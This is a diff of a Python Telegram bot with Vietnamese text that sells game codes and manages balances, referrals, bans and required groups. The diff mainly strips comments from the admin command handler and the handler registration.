-    # (các đối tượng Message của python-telegram-bot bản mới là bất biến)
     args = list(context.args or [])
     raw_text = message.text or ""
     cmd = (raw_text.split()[0].split("@")[0].lower()) if raw_text.strip() else ""
 
-    # ---- Gọi từ nút bấm trong Menu (chạy ngay, không tham số) ----
     if override_cmd:
         cmd = override_cmd
         args = []
         raw_text = override_cmd
 
-    # ---- Admin đang ở chế độ nhập liệu sau khi bấm nút trong /admin hoặc Menu ----
     elif user_id in admin_input_states:
         cmd_type = admin_input_states.pop(user_id)
         text_input = (message.text or "").strip()
@@ -2371,8 +2291,6 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
                 await message.reply_text(f"{E['CROSS']} Vui lòng nhập ID hợp lệ.", parse_mode="HTML")
                 return
         else:
-            # Các lệnh còn lại từ Menu: find, friends, biofriends, sendmsg, unall, uncap, skipip, unip, txlog, txfull, checkref,
-            # addgroup, delgroup, checkadmin, setprice, upprice, downprice...
             if not text_input:
                 await message.reply_text(f"{E['CROSS']} Vui lòng nhập dữ liệu hợp lệ.", parse_mode="HTML")
                 return
@@ -2381,9 +2299,6 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
         cmd = f"/{cmd_type}"
 
     try:
-        # ========================================================
-        # NHÓM 1: QUẢN LÝ KHO CODE
-        # ========================================================
         if cmd == "/addstock":
             lines = raw_text.split(maxsplit=1)
             if len(lines) < 2:
@@ -2400,13 +2315,11 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
                 await message.reply_text(f"{E['CROSS']} Không tìm thấy mã code hợp lệ.", parse_mode="HTML")
                 return
 
-            # Lọc trùng ngay trong danh sách vừa nhập (giữ nguyên thứ tự)
             unique_codes = list(dict.fromkeys(codes))
             dup_in_input = len(codes) - len(unique_codes)
 
             def add_codes_auto(cursor):
                 now = get_now_str()
-                # Lọc trùng với kho hiện có (cả code đã dùng lẫn chưa dùng)
                 cursor.execute(
                     "SELECT code_val FROM code_stock WHERE code_val = ANY(%s)",
                     (unique_codes,)
@@ -2522,9 +2435,6 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
                 )
             await message.reply_text(msg, parse_mode="HTML")
 
-        # ========================================================
-        # NHÓM 2: SỐ DƯ NGƯỜI DÙNG
-        # ========================================================
         elif cmd in ("/addbal", "/subbal"):
             if len(args) < 2:
                 await message.reply_text(f"Cú pháp: <code>{cmd} USER_ID SO_TIEN</code>", parse_mode="HTML")
@@ -2572,9 +2482,6 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
                 parse_mode="HTML",
             )
 
-        # ========================================================
-        # NHÓM 3: KHÓA / MỞ KHÓA TÀI KHOẢN
-        # ========================================================
         elif cmd == "/ban":
             if len(args) < 1:
                 await message.reply_text("Cú pháp: <code>/ban USER_ID</code>", parse_mode="HTML")
@@ -2680,9 +2587,6 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
                 parse_mode="HTML",
             )
 
-        # ========================================================
-        # NHÓM 4: TRA CỨU THÔNG TIN USER
-        # ========================================================
         elif cmd == "/info":
             if len(args) < 1:
                 await message.reply_text(f"{E['RIGHT']} <b>Cú pháp:</b> <code>/info USER_ID</code>", parse_mode="HTML")
@@ -2922,9 +2826,6 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
             if row: buttons.append(row)
             await message.reply_text(msg, reply_markup=InlineKeyboardMarkup(buttons) if buttons else None, parse_mode="HTML")
 
-        # ========================================================
-        # NHÓM 5: THỐNG KÊ & DANH SÁCH
-        # ========================================================
         elif cmd == "/stats":
             today = datetime.now(TIMEZONE).strftime("%Y-%m-%d") + "%"
             total = (await db_query("SELECT COUNT(*) FROM users", fetchone=True))[0]
@@ -3021,9 +2922,6 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
                 msg += f"{E['WARN']} <code>{val}</code> — <b>{cnt}</b> tài khoản\n   ID: {ids_txt}\n\n"
             await send_split_message(context.bot, chat_id, msg, parse_mode="HTML")
 
-        # ========================================================
-        # NHÓM 6: KIỂM TRA TIỂU SỬ BUFF REF (@Lienminhvietnam)
-        # ========================================================
         elif cmd == "/biofriends":
             if not args:
                 await message.reply_text(f"{E['WARN']} <b>Cú pháp:</b> <code>/biofriends USER_ID</code>", parse_mode="HTML")
@@ -3220,9 +3118,6 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
             full_report = "\n".join(report_lines)
             await send_split_message(context.bot, chat_id, full_report, parse_mode="HTML")
 
-        # ========================================================
-        # NHÓM 7: THÔNG BÁO & HỆ THỐNG
-        # ========================================================
         elif cmd == "/broadcast":
             if not args:
                 await message.reply_text("Cú pháp: <code>/broadcast Nội dung thông báo</code>", parse_mode="HTML")
@@ -3296,9 +3191,6 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
                 parse_mode="HTML",
             )
 
-        # ========================================================
-        # NHÓM 8: NHÓM YÊU CẦU THAM GIA
-        # ========================================================
         elif cmd == "/addgroup":
             if not args:
                 await message.reply_text(
@@ -3442,9 +3334,6 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
                 f"{E['INFO']} Thêm nhóm mới bằng <code>/addgroup</code>.",
                 parse_mode="HTML")
 
-        # ========================================================
-        # NHÓM 9: GIÁ CODE
-        # ========================================================
         elif cmd == "/price":
             await message.reply_text(
                 f"{E['MONEY']} <b>Giá code hiện tại:</b> <code>{CODE_PRICE:,}đ</code>\n"
@@ -3482,9 +3371,6 @@ async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE, ove
         await message.reply_text(f"{E['CROSS']} Đã xảy ra lỗi khi xử lý lệnh.", parse_mode="HTML")
 
 
-# ============================================================
-# 13. DISPATCHER & KHỞI CHẠY BOT
-# ============================================================
 MENU_BUTTON_TEXTS = (
     "Tài Khoản", "Mời Bạn Bè", "Rút Code", "Top",
     "Nhóm Hỗ Trợ", "Lịch Sử Giao Dịch", "Link Game", "Menu",
@@ -3495,7 +3381,6 @@ async def text_message_dispatcher(update: Update, context: ContextTypes.DEFAULT_
     if not update.effective_message: return
     user = update.effective_user
     txt = (update.effective_message.text or "").strip()
-    # Admin đang chờ nhập liệu mà bấm 1 nút menu khác -> hủy chế độ nhập, xử lý như nút bấm bình thường
     if user and user.id in admin_input_states and (txt in MENU_BUTTON_TEXTS or is_admin_kb_text(txt)):
         admin_input_states.pop(user.id, None)
     if user and user.id in admin_input_states and user.id in ADMIN_IDS:
@@ -3519,12 +3404,10 @@ def main():
     if not DATABASE_URL: raise RuntimeError("Chưa cấu hình DATABASE_URL.")
     app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
 
-    # ---- Lệnh cơ bản ----
     app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("settings", admin_menu_command))   # trước đây: /menu
-    app.add_handler(CommandHandler("admin", adm_panel_command))       # trước đây: /adm
+    app.add_handler(CommandHandler("settings", admin_menu_command))
+    app.add_handler(CommandHandler("admin", adm_panel_command))
 
-    # ---- Callback (nút bấm) ----
     app.add_handler(CallbackQueryHandler(admin_toggle_callback, pattern=r"^(toggle_|admin_verify_all)"))
     app.add_handler(CallbackQueryHandler(adm_step_callback, pattern=r"^adm_(step_|act_)"))
     app.add_handler(CallbackQueryHandler(admin_confirm_callback, pattern=r"^(amy_|amcancel$)"))
@@ -3532,34 +3415,23 @@ def main():
     app.add_handler(CallbackQueryHandler(verify_join_callback, pattern=r"^verify_join$"))
     app.add_handler(CallbackQueryHandler(code_buy_callback, pattern=r"^(buycode_|approve_code_|reject_code_)"))
 
-    # ---- Dữ liệu đặc biệt (danh bạ, mini app) ----
     app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
     app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, web_app_data_handler))
 
-    # ---- Lệnh admin (tên mới) ----
     admin_cmds = [
-        # Kho code
         "addstock", "liststock", "stock", "clearstock", "clearstockall", "delhistory", "buyhistory",
-        # Số dư
         "addbal", "subbal", "zerobal",
-        # Khóa / mở khóa
         "ban", "unban", "banwd", "unbanwd", "unall", "uncap", "skipip", "unip", "resetverify",
-        # Tra cứu
         "info", "detail", "find", "txlog", "txfull", "checkfriends", "friends", "users",
-        # Thống kê / danh sách
         "stats", "banlist", "wdbanlist", "topbal", "dupip", "dupphone",
-        # Kiểm tra tiểu sử buff ref
         "biofriends", "scanbio", "banbuff", "checkref",
-        # Thông báo & hệ thống
         "broadcast", "sendmsg", "maint", "wipeall",
-        # Nhóm yêu cầu & giá code
         "addgroup", "delgroup", "listgroup", "checkgroup", "checkadmin", "clearallgroup",
         "price", "setprice", "upprice", "downprice",
     ]
     for command in admin_cmds:
         app.add_handler(CommandHandler(command, admin_commands))
 
-    # ---- Tin nhắn văn bản (menu người dùng + nhập liệu admin) ----
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_message_dispatcher))
     app.add_error_handler(error_handler)
 
